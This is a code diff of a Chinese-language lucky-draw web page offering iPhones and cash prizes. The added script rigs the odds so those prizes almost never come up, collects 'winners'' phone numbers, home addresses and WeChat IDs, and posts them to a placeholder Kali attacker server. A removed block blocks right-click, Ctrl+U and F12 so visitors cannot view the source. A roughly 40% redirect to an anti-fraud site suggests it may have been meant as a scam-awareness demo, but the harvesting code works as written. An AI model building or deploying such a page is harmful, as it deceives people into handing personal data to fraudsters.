+                if (devMode) return false;
+                
+                if (spinCounter >= 5) {
+                    spinButton.disabled = true;
+                    spinButton.textContent = "今日次数已用完";
+                    limitNotice.style.display = "block";
+                    return true;
+                }
+                return false;
+            }
+            
+            // 初始化时检查限制
+            checkDailyLimit();
+            
+            // 开发者模式激活提示
+            if (devMode) {
+                spinButton.textContent = "开始抽奖 (无限模式)";
+                devModeNotice.style.display = "block";
+                counterEl.textContent = spinCounter + " (无限)";
+            }
+            
+            // 开发者模式激活功能
+            centerLogo.addEventListener('click', function() {
+                const now = Date.now();
+                
+                // 如果点击间隔超过2秒，重置计数
+                if (now - lastClickTime > 2000) {
+                    clickCount = 0;
+                    devModeCount.style.display = "none";
+                }
+                
+                clickCount++;
+                lastClickTime = now;
+                
+                // 显示点击计数
+                devModeCount.textContent = `点击次数: ${clickCount}/5`;
+                devModeCount.style.display = "block";
+                
+                // 5秒后隐藏计数
+                clearTimeout(window.devModeTimeout);
+                window.devModeTimeout = setTimeout(() => {
+                    devModeCount.style.display = "none";
+                }, 2000);
+                
+                // 如果点击了5次，激活开发者模式
+                if (clickCount >= 5) {
+                    devMode = true;
+                    localStorage.setItem('devMode', 'true');
+                    devModeNotice.style.display = "block";
+                    spinButton.disabled = false;
+                    spinButton.textContent = "开始抽奖 (无限模式)";
+                    limitNotice.style.display = "none";
+                    counterEl.textContent = spinCounter + " (无限)";
+                    
+                    // 隐藏计数显示
+                    devModeCount.style.display = "none";
+                    
+                    // 添加庆祝效果
+                    createConfetti();
+                }
+            });
+            
+            // 自动播放音乐
+            function playMusic() {
+                bgMusic.play().then(() => {
+                    musicPlaying = true;
+                    musicControl.innerHTML = '<i>🔊</i>';
+                }).catch(error => {
+                    console.log('自动播放受阻，需要用户交互', error);
+                    musicPlaying = false;
+                    musicControl.innerHTML = '<i>🔇</i>';
+                });
+            }
+            
+            // 尝试自动播放音乐
+            setTimeout(playMusic, 1000);
+            
+            // 音乐控制
+            musicControl.addEventListener('click', function() {
+                if (musicPlaying) {
+                    bgMusic.pause();
+                    musicControl.innerHTML = '<i>🔇</i>';
+                } else {
+                    bgMusic.play();
+                    musicControl.innerHTML = '<i>🔊</i>';
+                }
+                musicPlaying = !musicPlaying;
+            });
+            
+            // 奖项配置（概率：14 Pro max 0.5%，15 Pro max 0.5%，16 Pro max 0.5%，2025元 0.5%，国家反诈中心 40%，加入qq群 58%）
+            // 重新定义奖项，确保与转盘上的位置完全对应
+            const prizes = [
+                { name: "14 Pro max", angle: 0, probability: 0.005, type: "device" },
+                { name: "加入qq群", angle: 60, probability: 0.58, type: "qq" }, // 修复：将type改为qq
+                { name: "国家反诈中心", angle: 120, probability: 0.4, type: "redirect" },
+                { name: "2025元", angle: 180, probability: 0.005, type: "money" },
+                { name: "16 Pro max", angle: 240, probability: 0.005, type: "device" },
+                { name: "15 Pro max", angle: 300, probability: 0.005, type: "device" }
+            ];
+            
+            // 创建彩色纸屑效果
+            function createConfetti() {
+                const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+                for (let i = 0; i < 50; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = (5 + Math.random() * 10) + 'px';
+                    confetti.style.height = (5 + Math.random() * 10) + 'px';
+                    confetti.style.animation = `fall ${3 + Math.random() * 5}s linear forwards`;
+                    document.body.appendChild(confetti);
+                    
+                    // 动画结束后移除元素
+                    setTimeout(() => {
+                        confetti.remove();
+                    }, 8000);
+                }
+            }
+            
+            // 保存信息到服务器
+            async function saveInfoToServer(data, type) {
+                try {
+                    // 发送数据到Kali服务器
+                    const response = await fetch('http://your-kali-server-ip:8000/save-info', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            type: type,
+                            data: data,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        return { success: true, message: "信息保存成功" };
+                    } else {
+                        return { success: false, message: "服务器错误，请重试" };
+                    }
+                } catch (error) {
+                    console.error("保存信息失败:", error);
+                    return { success: false, message: "网络错误，请重试" };
+                }
+            }
+            
+            // 处理表单提交
+            submitAddressBtn.addEventListener('click', async function() {
+                const phone = document.getElementById('phone').value;
+                const address = document.getElementById('address').value;
+                
+                if (!phone || !address) {
+                    addressError.textContent = "请填写完整信息";
+                    addressError.style.display = "block";
+                    setTimeout(() => {
+                        addressError.style.display = "none";
+                    }, 2000);
+                    return;
+                }
+                
+                // 验证手机号格式
+                if (!/^1[3-9]\d{9}$/.test(phone)) {
+                    addressError.textContent = "请输入有效的手机号";
+                    addressError.style.display = "block";
+                    setTimeout(() => {
+                        addressError.style.display = "none";
+                    }, 2000);
+                    return;
+                }
+                
+                const result = await saveInfoToServer({
+                    phone: phone,
+                    address: address,
+                    prize: currentPrize.name,
+                    time: new Date().toLocaleString()
+                }, "address");
+                
+                if (result.success) {
+                    addressSuccess.style.display = "block";
+                    addressForm.style.display = "none";
+                    setTimeout(() => {
+                        addressSuccess.style.display = "none";
+                    }, 2000);
+                } else {
+                    addressError.textContent = result.message;
+                    addressError.style.display = "block";
+                    setTimeout(() => {
+                        addressError.style.display = "none";
+                    }, 2000);
+                }
+            });
+            
+            // 处理中奖信息提交
+            submitWinnerBtn.addEventListener('click', async function() {
+                const phone = document.getElementById('winnerPhone').value;
+                const wechat = document.getElementById('wechat').value;
+                
+                if (!phone || !wechat) {
+                    winnerError.textContent = "请填写完整信息";
+                    winnerError.style.display = "block";
+                    setTimeout(() => {
+                        winnerError.style.display = "none";
+                    }, 2000);
+                    return;
+                }
+                
+                // 验证手机号格式
+                if (!/^1[3-9]\d{9}$/.test(phone)) {
+                    winnerError.textContent = "请输入有效的手机号";
+                    winnerError.style.display = "block";
+                    setTimeout(() => {
+                        winnerError.style.display = "none";
+                    }, 2000);
+                    return;
+                }
+                
+                const result = await saveInfoToServer({
+                    phone: phone,
+                    wechat: wechat,
+                    prize: currentPrize.name,
+                    time: new Date().toLocaleString()
+                }, "winner");
+                
+                if (result.success) {
+                    winnerSuccess.style.display = "block";
+                    winnerForm.style.display = "none";
+                    setTimeout(() => {
+                        winnerSuccess.style.display = "none";
+                    }, 2000);
+                } else {
+                    winnerError.textContent = result.message;
+                    winnerError.style.display = "block";
+                    setTimeout(() => {
+                        winnerError.style.display = "none";
+                    }, 2000);
+                }
+            });
+            
+            // 核心函数：执行转盘旋转
+            function spinWheel() {
+                if (spinning) return;
+                
+                // 检查每日限制（开发者模式除外）
+                if (!devMode && checkDailyLimit()) return;
+                
+                spinning = true;
+                spinButton.disabled = true;
+                result.textContent = "转盘中...";
+                redirectNotice.style.display = "none";
+                limitNotice.style.display = "none";
+                
+                // 隐藏图片和表单
+                qqImage.style.display = "none";
+                addressForm.style.display = "none";
+                winnerForm.style.display = "none";
+                
+                // 随机选择奖项（根据概率）
+                let selectedPrize;
+                let random = Math.random();
+                let cumulativeProbability = 0;
+                
+                for (let i = 0; i < prizes.length; i++) {
+                    cumulativeProbability += prizes[i].probability;
+                    if (random <= cumulativeProbability) {
+                        selectedPrize = prizes[i];
+                        break;
+                    }
+                }
+                
+                currentPrize = selectedPrize;
+                
+                // 计算旋转角度（多转几圈然后停在选中奖项）
+                // 指针在中心，所以需要调整角度计算
+                const extraRotations = 5; // 额外旋转圈数
+                // 修改：确保转盘停在正确的位置，使指针指向中心区域
+                const targetAngle = 360 * extraRotations + (360 - selectedPrize.angle) + 30;
+                
+                // 重置转盘位置，避免从当前位置开始旋转
+                wheel.style.transition = 'none';
+                wheel.style.transform = `rotate(0deg)`;
+                
+                // 强制重绘
+                void wheel.offsetWidth;
+                
+                // 设置旋转动画
+                wheel.style.transition = 'transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67)';
+                wheel.style.transform = `rotate(${targetAngle}deg)`;
+                
+                // 增加计数器并保存（开发者模式除外）
+                spinCounter++;
+                if (!devMode) {
+                    counterEl.textContent = spinCounter;
+                    saveSpinCount(spinCounter);
+                } else {
+                    counterEl.textContent = spinCounter + " (无限)";
+                }
+                
+                // 显示结果
+                setTimeout(function() {
+                    // 统一显示文字格式
+                    result.textContent = `恭喜您抽中了: ${selectedPrize.name}`;
+                    
+                    if (selectedPrize.type === "redirect") {
+                        redirectNotice.style.display = "block";
+                        setTimeout(function() {
+                            window.location.href = antifraudWebsite;
+                        }, 2000);
+                    } else if (selectedPrize.type === "qq") {
+                        // 直接显示图片
+                        qqImage.style.display = "block";
+                        createConfetti();
+                    } else if (selectedPrize.type === "device") {
+                        // 显示收货信息表单
+                        addressForm.style.display = "block";
+                        createConfetti();
+                    } else if (selectedPrize.type === "money") {
+                        // 显示中奖信息表单
+                        winnerForm.style.display = "block";
+                        createConfetti();
+                    } else {
+                        createConfetti();
+                    }
+                    
+                    spinning = false;
+                    
+                    // 检查是否达到限制（开发者模式除外）
+                    if (!devMode && spinCounter >= 5) {
+                        spinButton.textContent = "今日次数已用完";
+                        limitNotice.style.display = "block";
+                    } else {
+                        spinButton.disabled = false;
+                    }
+                }, 4500);
+            }
+            
+            // 绑定开始抽奖按钮
+            spinButton.addEventListener('click', function() {
+                spinWheel();
+            });
+        });
+    </script>
 </body>
-<script>
-// 更新时间显示函数
-function updateTime() {
-  const now = new Date();
-  const year = now.getFullYear();
-  const month = (now.getMonth() + 1).toString().padStart(2, '0');
-  const date = now.getDate().toString().padStart(2, '0');
-  const day = now.getDay();
-  const dayNames = ['星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六'];
-  const hours = now.getHours().toString().padStart(2, '0');
-  const minutes = now.getMinutes().toString().padStart(2, '0');
-  const seconds = now.getSeconds().toString().padStart(2, '0');
-  
-  const timeString = `${year}-${month}-${date} ${dayNames[day]} ${hours}:${minutes}:${seconds}`;
-  document.getElementById('current-time').textContent = timeString;
-}
-
-// 初始更新时间并每秒更新
-updateTime();
-setInterval(updateTime, 1000);
-
-//按键触发 
-document.onkeydown = function(event){
-  //禁止 ctrl+u
-  if (event.ctrlKey && event.keyCode === 85){
-    return false;
-  }
-  //禁止 F12
-  if (window.event && window.event.keyCode === 123) {
-    event.keyCode = 0;
-    event.returnValue = false;
-    return false;
-  }
-}
-
-//网站禁止右键
-document.body.oncontextmenu = function(event) {
-  event.returnValue = false;
-  return false;
-};
-</script>
 </html>
